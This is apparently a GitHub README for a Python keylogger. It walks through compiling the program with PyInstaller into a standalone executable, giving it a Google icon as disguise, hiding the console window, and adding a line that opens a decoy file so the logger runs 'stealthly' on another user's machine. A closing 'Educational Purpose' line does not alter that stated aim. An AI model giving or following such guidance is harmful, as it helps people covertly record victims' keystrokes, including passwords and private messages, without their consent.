# Keylogger-Python

#### **This program is use to record the keystroke of the user, as this program has launch in the user\'s local machine.**



**I recommend you to use \"PyInstaller\" as your third-party compiler, if you want it to use this as a executable file and stealthly use it in the user\'s local machine.**



Type this in your Command Prompt or Powershell:

```bash
pip install pyinstaller
```

Or this:

```bash
pip3 install pyinstaller
```



If this command is doesn\'t work, use this command instead:

```bash
py -m pip install pyinstaller
```

Or this:

```bash
py -m pip3 install pyinstaller
```



If you want it to compile \"keylogger.py\" source code, type this following command:

```bash
pyinstaller keylogger.py -F
```

With icon:

```bash
pyinstaller keylogger.py -F -i google.png
```



If with this error has appeared in your console:

```bash
ValueError: Received icon image 'C:\Users\google.png' which exists but is not in the correct format. On this platform, only ('exe', 'ico') images may be used as icons. If Pillow is installed, automatic conversion will be attempted. Please install Pillow or convert your 'png' file to one of ('exe', 'ico') and try again.
```




Then type this in your console:

```bash
py -m pip install Pillow
```


This allows \"PyInstaller\" to convert the non-icon picture file into \".ico\" file, in order to apply this in your program.

Type the command again, to make sure that this is more effective in creating an icon in the program. You can also use an .exe file, as you wish also to get and use the icon of an .exe file.



*Note: As this source has been compiled, .spec file, build and dist directory, will exist in your current directory. The .exe compiled source code is in \".\dist\\\".*




To make the program stealthly progressing in the user\'s local machine, type this command:
```bash
pyinstaller keylogger.py -F --bootloader-ignore-signals --disable-windowed-traceback --noconsole --nowindowed
```



Its more stealthy, if this code was added in \"keylogger.py\"
```python
os.startfile("<filename>")
```
Or:
```python
os.system("<filename>")
```


\****This is only for Educational Purpose****



**Author: Arley-Techie**

**Github Repository: https://github.com/Arley-Techie/keylogger-python**
